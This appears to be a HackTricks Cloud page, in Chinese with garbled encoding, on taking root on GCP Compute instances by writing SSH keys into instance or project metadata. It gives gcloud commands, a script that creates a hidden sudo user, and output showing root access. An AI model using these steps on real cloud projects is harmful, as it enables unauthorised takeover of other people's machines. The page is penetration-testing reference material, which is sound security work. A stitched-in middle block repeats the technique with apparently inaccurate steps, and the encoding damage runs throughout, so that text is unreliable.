# GCP - æ·»åŠ è‡ªå®šä¹‰SSHå…ƒæ•°æ®

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä¿®æ”¹å…ƒæ•°æ® <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

æ‹¥æœ‰**ä¿®æ”¹å®ä¾‹å…ƒæ•°æ®**æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªæƒé™ï¼ˆå¯èƒ½å—èŒƒå›´é™åˆ¶ï¼‰å±å®³/æå‡åˆ°æœåŠ¡è´¦æˆ·ï¼š

### **å°†SSHå¯†é’¥æ·»åŠ åˆ°è‡ªå®šä¹‰å…ƒæ•°æ®**

åœ¨GCPä¸Šè¿è¡Œçš„**Linux** **ç³»ç»Ÿ**é€šå¸¸ä¼šè¿è¡Œ[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)è„šæœ¬ã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯[è´¦æˆ·å®ˆæŠ¤è¿›ç¨‹](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ï¼Œå®ƒä¼š**å®šæœŸ** **æŸ¥è¯¢**å®ä¾‹å…ƒæ•°æ®ç«¯ç‚¹ï¼Œä»¥è·å–**æˆæƒSSHå…¬é’¥çš„æ›´æ”¹**ã€‚

**å¦‚æœé‡åˆ°æ–°çš„å…¬é’¥**ï¼Œå®ƒå°†è¢«å¤„ç†å¹¶**æ·»åŠ åˆ°æœ¬åœ°æœºå™¨**ã€‚æ ¹æ®å¯†é’¥çš„æ ¼å¼ï¼Œå®ƒå°†è¢«æ·»åŠ åˆ°**ç°æœ‰ç”¨æˆ·çš„`~/.ssh/authorized_keys`æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªå…·æœ‰`sudo`æƒé™çš„æ–°ç”¨æˆ·**ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨æ‚¨çš„æœåŠ¡è´¦æˆ·**ä¿®æ”¹è‡ªå®šä¹‰å®ä¾‹å…ƒæ•°æ®**ï¼Œæ‚¨å¯ä»¥é€šè¿‡**è·å¾—å¯¹ç‰¹æƒè´¦æˆ·çš„SSHæƒé™**æ¥åœ¨æœ¬åœ°ç³»ç»Ÿä¸Š**æå‡**ä¸ºrootã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹**è‡ªå®šä¹‰é¡¹ç›®å…ƒæ•°æ®**ï¼Œæ‚¨å¯ä»¥åœ¨è¿è¡Œè´¦æˆ·å®ˆæŠ¤è¿›ç¨‹çš„**å½“å‰GCPé¡¹ç›®ä¸­çš„ä»»ä½•ç³»ç»Ÿä¸Šæå‡**ä¸ºrootã€‚

### **å‘ç°æœ‰ç‰¹æƒç”¨æˆ·æ·»åŠ SSHå¯†é’¥**

è®©æˆ‘ä»¬é¦–å…ˆå‘ä¸€ä¸ªç°æœ‰è´¦æˆ·æ·»åŠ æˆ‘ä»¬è‡ªå·±çš„å¯†é’¥ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šäº§ç”Ÿæœ€å°çš„å¹²æ‰°ã€‚

**æ£€æŸ¥å®ä¾‹ä¸­ç°æœ‰çš„SSHå¯†é’¥**ã€‚é€‰æ‹©å…¶ä¸­ä¸€ä¸ªç”¨æˆ·ï¼Œå› ä¸ºä»–ä»¬å¾ˆå¯èƒ½æ‹¥æœ‰sudoæƒé™ã€‚
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
```markdown
# GCP Compute Privilege Escalation via Custom SSH Metadata

åœ¨ GCP ä¸­ï¼Œå¦‚æœä½ æœ‰æƒé™ä¿®æ”¹ä¸€ä¸ª Compute Engine å®ä¾‹çš„å…ƒæ•°æ®ï¼Œä½ å¯ä»¥é€šè¿‡æ·»åŠ è‡ªå®šä¹‰ SSH å¯†é’¥æ¥æå‡æƒé™ã€‚è¿™å¯ä»¥è®©ä½ ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ç™»å½•åˆ°å®ä¾‹ä¸­ï¼ŒåŒ…æ‹¬ root ç”¨æˆ·ã€‚

## æ­¥éª¤

1. ç¡®è®¤ä½ å¯¹ç›®æ ‡å®ä¾‹æœ‰ç¼–è¾‘æƒé™ã€‚
2. åœ¨ GCP æ§åˆ¶å°ä¸­ï¼Œå¯¼èˆªåˆ° Compute Engineã€‚
3. é€‰æ‹©ç›®æ ‡å®ä¾‹ã€‚
4. ç‚¹å‡»â€œç¼–è¾‘â€æŒ‰é’®ã€‚
5. å‘ä¸‹æ»šåŠ¨åˆ°â€œSSH å¯†é’¥â€éƒ¨åˆ†ã€‚
6. ç‚¹å‡»â€œæ˜¾ç¤ºå’Œç¼–è¾‘â€ã€‚
7. åœ¨æ–‡æœ¬æ¡†ä¸­ç²˜è´´ä½ çš„å…¬é’¥ã€‚
8. ç‚¹å‡»â€œä¿å­˜â€å¹¶ç­‰å¾…å®ä¾‹é‡å¯ã€‚

ä¸€æ—¦å®ä¾‹é‡å¯ï¼Œä½ åº”è¯¥èƒ½å¤Ÿä½¿ç”¨ä½ çš„ç§é’¥ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ç™»å½•ã€‚

## æ³¨æ„äº‹é¡¹

- ç¡®ä¿ä½ çš„ SSH å¯†é’¥æ ¼å¼æ­£ç¡®ï¼Œå¦åˆ™å¯èƒ½æ— æ³•æ·»åŠ ã€‚
- å¦‚æœå®ä¾‹é…ç½®ä¸ºä»é¡¹ç›®å…ƒæ•°æ®ç»§æ‰¿ SSH å¯†é’¥ï¼Œä½ å¯èƒ½éœ€è¦åœ¨é¡¹ç›®çº§åˆ«æ·»åŠ ä½ çš„å¯†é’¥ã€‚
- ä¸€äº›ç»„ç»‡å¯èƒ½æœ‰é¢å¤–çš„å®‰å…¨æªæ–½æ¥é˜²æ­¢è¿™ç§ç±»å‹çš„æƒé™æå‡ï¼Œä¾‹å¦‚ OS Loginã€‚

## ç»“è®º

é€šè¿‡æ·»åŠ è‡ªå®šä¹‰ SSH å¯†é’¥åˆ° GCP Compute Engine å®ä¾‹çš„å…ƒæ•°æ®ï¼Œä½ å¯ä»¥å®ç°æƒé™æå‡ã€‚è¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æŠ€æœ¯ï¼Œä½†ä¹Ÿè¦æ³¨æ„å¯èƒ½å­˜åœ¨çš„å®‰å…¨é™åˆ¶ã€‚
```
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
æ³¨æ„å…¬é’¥çš„**ç•¥å¾®å¥‡æ€ªçš„æ ¼å¼** - **ç”¨æˆ·å**åˆ—åœ¨**å¼€å¤´**ï¼ˆåé¢è·Ÿç€å†’å·ï¼‰ï¼Œç„¶ååœ¨**æœ«å°¾**å†æ¬¡å‡ºç°ã€‚æˆ‘ä»¬éœ€è¦åŒ¹é…è¿™ç§æ ¼å¼ã€‚ä¸æ­£å¸¸çš„SSHå¯†é’¥æ“ä½œä¸åŒï¼Œç”¨æˆ·åç»å¯¹é‡è¦ï¼

**å°†å¸¦æœ‰ç”¨æˆ·åå’Œå¯†é’¥çš„è¡Œä¿å­˜åœ¨ä¸€ä¸ªåä¸º** `meta.txt` **çš„æ–°æ–‡æœ¬æ–‡ä»¶ä¸­**ã€‚

å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡ç”¨æˆ·æ˜¯ä¸Šé¢çš„`alice`ã€‚æˆ‘ä»¬å°†ä¸ºè‡ªå·±**ç”Ÿæˆä¸€ä¸ªæ–°å¯†é’¥**ï¼Œåƒè¿™æ ·ï¼š
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
å°†æ‚¨çš„æ–°å…¬é’¥æ·»åŠ åˆ°æ–‡ä»¶ `meta.txt` ä¸­ï¼Œæ¨¡ä»¿ä»¥ä¸‹æ ¼å¼ï¼š
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæ‚¨çš„å®ä¾‹**é‡å†™SSHå¯†é’¥å…ƒæ•°æ®**ï¼š
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
ä½ ç°åœ¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼**ä»¥`alice`çš„ä¸Šä¸‹æ–‡è®¿é—®shell**ï¼š
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **åˆ›å»ºä¸€ä¸ªæ–°çš„ç‰¹æƒç”¨æˆ·å¹¶æ·»åŠ  SSH å¯†é’¥**

æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æ²¡æœ‰æ‰¾åˆ°ç°æœ‰çš„å¯†é’¥ï¼Ÿåœ¨ `/etc/passwd` ä¸­æ²¡æœ‰å…¶ä»–æœ‰è¶£çš„ç›®æ ‡ç”¨æˆ·ï¼Ÿ

æ‚¨å¯ä»¥**éµå¾ªä¸Šè¿°ç›¸åŒçš„è¿‡ç¨‹**ï¼Œä½†åªéœ€**ç¼–é€ ä¸€ä¸ªæ–°çš„ç”¨æˆ·å**ã€‚è¿™ä¸ªç”¨æˆ·å°†ä¼šè‡ªåŠ¨è¢«åˆ›å»ºï¼Œå¹¶è¢«èµ‹äºˆ `sudo` æƒé™ã€‚è„šæœ¬åŒ–çš„è¿‡ç¨‹çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### é¡¹ç›®çº§åˆ«çš„SSHå¯†é’¥ <a href="#sshing-around" id="sshing-around"></a>

æ ¹æ®å‰ä¸€èŠ‚ä¸­æåˆ°çš„ç»†èŠ‚ï¼Œæ‚¨å¯ä»¥å°è¯•æ”»ç ´æ›´å¤šçš„è™šæ‹Ÿæœºã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡[**åœ¨é¡¹ç›®çº§åˆ«åº”ç”¨SSHå¯†é’¥**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ï¼Œä¸ºæ‚¨æˆäºˆæƒé™ï¼Œä½¿æ‚¨èƒ½å¤Ÿ**SSHè¿›å…¥ä»»ä½•æœªæ˜ç¡®é€‰æ‹©â€œé˜»æ­¢é¡¹ç›®èŒƒå›´SSHå¯†é’¥â€é€‰é¡¹çš„å®ä¾‹çš„ç‰¹æƒè´¦æˆ·**ã€‚
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
å¦‚æœä½ çœŸçš„å¾ˆå¤§èƒ†ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥ `gcloud compute ssh [INSTANCE]` æ¥ä½¿ç”¨ä½ å½“å‰çš„ç”¨æˆ·åè¿æ¥å…¶ä»–æœºå™¨ã€‚

# å‚è€ƒèµ„æ–™
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ **HackTricks** ä¸Šçœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
